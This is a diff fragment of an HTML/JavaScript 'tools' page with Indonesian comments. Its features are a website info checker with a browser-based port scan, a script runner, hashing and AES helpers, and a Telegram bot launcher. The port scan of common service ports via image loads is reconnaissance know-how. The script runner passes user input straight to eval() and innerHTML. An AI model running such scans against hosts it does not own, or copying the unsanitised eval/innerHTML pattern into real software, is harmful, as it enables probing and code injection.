+      let proxyUrl = "https://api.allorigins.hexocode.repl.co/get?disableCache=true&url=" + encodeURIComponent(url);
+      
+      fetch(proxyUrl, { method: 'GET' })
+        .then(response => {
+          if (!response.ok) throw new Error("Response tidak ok");
+          return response.json();
+        })
+        .then(data => {
+          let diff = performance.now() - start;
+          // Dapatkan IP melalui API DNS Google
+          fetch("https://dns.google/resolve?name=" + hostname + "&type=A")
+            .then(resp => resp.json())
+            .then(dnsData => {
+              let ip = "N/A";
+              if(dnsData.Answer) {
+                ip = dnsData.Answer.map(ans => ans.data).join(", ");
+              }
+              // Scan port sederhana
+              const ports = [21,22,23,25,53,80,110,143,443,8080];
+              const portPromises = ports.map(port => {
+                return new Promise(resolve => {
+                  const img = new Image();
+                  const timer = setTimeout(() => resolve({ port: port, open: false }), 2000);
+                  img.onload = function() { clearTimeout(timer); resolve({ port: port, open: true }); };
+                  img.onerror = function() { clearTimeout(timer); resolve({ port: port, open: false }); };
+                  img.src = "http://" + hostname + ":" + port + "/favicon.ico?" + new Date().getTime();
+                });
+              });
+              Promise.all(portPromises).then(results => {
+                const openPorts = results.filter(r => r.open).map(r => r.port).join(", ") || "None";
+                const infoHtml = `<strong>IP Address:</strong> ${ip}<br>
+                                    <strong>Open Ports:</strong> ${openPorts}<br>
+                                    <strong>Response Time:</strong> ${diff.toFixed(2)} ms<br>
+                                    <strong>Status:</strong> Success`;
+                document.getElementById('infoResult').innerHTML = infoHtml;
+              });
+            })
+            .catch(err => {
+              document.getElementById('infoResult').innerHTML = "Error mendapatkan IP: " + err;
+            });
+        })
+        .catch(err => {
+          document.getElementById('infoResult').innerHTML = "Error mengakses website: " + err;
+        });
+    }
+    
+    /* --- Fitur Script Runner (Menu 5) --- */
+    function runScript() {
+      const scriptType = document.getElementById('scriptType').value;
+      const scriptContent = document.getElementById('scriptContent').value;
+      const outputDiv = document.getElementById('scriptOutput');
+      outputDiv.innerHTML = ""; // Bersihkan hasil sebelumnya
+      
+      if(scriptType === "HTML") {
+        outputDiv.innerHTML = scriptContent;
+      } else if(scriptType === "CSS") {
+        const styleTag = document.createElement('style');
+        styleTag.innerHTML = scriptContent;
+        document.head.appendChild(styleTag);
+        outputDiv.innerHTML = "CSS script dijalankan. Cek tampilan halaman.";
+      } else if(scriptType === "JavaScript") {
+        try {
+          eval(scriptContent);
+          outputDiv.innerHTML = "JavaScript script dijalankan.";
+        } catch(e) {
+          outputDiv.innerHTML = "Error: " + e;
+        }
+      } else if(scriptType === "PHP") {
+        outputDiv.innerHTML = "PHP tidak bisa dijalankan di sisi klien.";
+      } else if(scriptType === "Random") {
+        const options = ["HTML", "CSS", "JavaScript"];
+        const chosen = options[Math.floor(Math.random() * options.length)];
+        if(chosen === "HTML") {
+          outputDiv.innerHTML = scriptContent;
+        } else if(chosen === "CSS") {
+          const styleTag = document.createElement('style');
+          styleTag.innerHTML = scriptContent;
+          document.head.appendChild(styleTag);
+          outputDiv.innerHTML = "CSS script dijalankan secara random.";
+        } else if(chosen === "JavaScript") {
+          try {
+            eval(scriptContent);
+            outputDiv.innerHTML = "JavaScript script dijalankan secara random.";
+          } catch(e) {
+            outputDiv.innerHTML = "Error: " + e;
+          }
+        }
+      }
+    }
+    
+    /* --- Fitur Encryption Tools (Menu 6) --- */
+    function toggleAESKey() {
+      var method = document.getElementById('encryptMethod').value;
+      var container = document.getElementById('aesKeyContainer');
+      container.style.display = (method === "AES") ? "block" : "none";
+    }
+    
+    function encryptText() {
+      var input = document.getElementById('encryptInput').value;
+      var method = document.getElementById('encryptMethod').value;
+      var result = "";
+      
+      if(!input) {
+        alert("Masukkan teks terlebih dahulu!");
+        return;
+      }
+      
+      if(method === "SHA-256") {
+        result = CryptoJS.SHA256(input).toString();
+      } else if(method === "MD5") {
+        result = CryptoJS.MD5(input).toString();
+      } else if(method === "Base64") {
+        result = CryptoJS.enc.Base64.stringify(CryptoJS.enc.Utf8.parse(input));
+      } else if(method === "Salt") {
+        // Generate salt (16 bytes dalam heksadesimal)
+        result = CryptoJS.lib.WordArray.random(16).toString();
+      } else if(method === "Hash+Salt") {
+        var salt = CryptoJS.lib.WordArray.random(16).toString();
+        var hash = CryptoJS.SHA256(input + salt).toString();
+        result = "Salt: " + salt + "<br>Hash: " + hash;
+      } else if(method === "AES") {
+        var key = document.getElementById('aesKey').value;
+        if(!key) {
+          alert("Masukkan key untuk AES encryption!");
+          return;
+        }
+        result = CryptoJS.AES.encrypt(input, key).toString();
+      }
+      document.getElementById('encryptResult').innerHTML = result;
+    }
+    
+    function copyEncryptResult() {
+      var resultText = document.getElementById('encryptResult').innerText;
+      navigator.clipboard.writeText(resultText).then(function() {
+        alert("Hasil berhasil dicopy!");
+      }, function(err) {
+        alert("Gagal menyalin teks: " + err);
+      });
+    }
+    
+    /* --- Fitur Telegram Bot Control (Menu 7) --- */
+    function startTelegramBot() {
+      var token = document.getElementById('botToken').value.trim();
+      var script = document.getElementById('botScript').value;
+      var fileInput = document.getElementById('botFile');
+      
+      if(!token) {
+        alert("Masukkan Bot Token terlebih dahulu!");
+        return;
+      }
+      
+      // Siapkan FormData untuk dikirim ke server
+      var formData = new FormData();
+      formData.append('token', token);
+      if(script) {
+        formData.append('script', script);
+      }
+      if(fileInput.files.length > 0) {
+        formData.append('botFile', fileInput.files[0]);
+      }
+      
+      // Kirim data ke endpoint server (endpoint ini harus diimplementasikan di backend)
+      fetch('/start-telegram-bot', {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => response.json())
+      .then(data => {
+        document.getElementById('botStatus').innerHTML = data.message;
+        // Misalnya, simpan status bot di localStorage agar tetap aktif meskipun refresh
+        localStorage.setItem('botRunning', 'true');
+      })
+      .catch(err => {
+        document.getElementById('botStatus').innerHTML = "Error: " + err;
+      });
+    }
+    
+    function stopTelegramBot() {
+      // Kirim perintah ke endpoint server untuk menghentikan bot
+      fetch('/stop-telegram-bot', {
+        method: 'POST'
+      })
+      .then(response => response.json())
+      .then(data => {
+        document.getElementById('botStatus').innerHTML = data.message;
+        localStorage.removeItem('botRunning');
+      })
+      .catch(err => {
+        document.getElementById('botStatus').innerHTML = "Error: " + err;
+      });
+    }
+  </script>
+</body>
+</html>
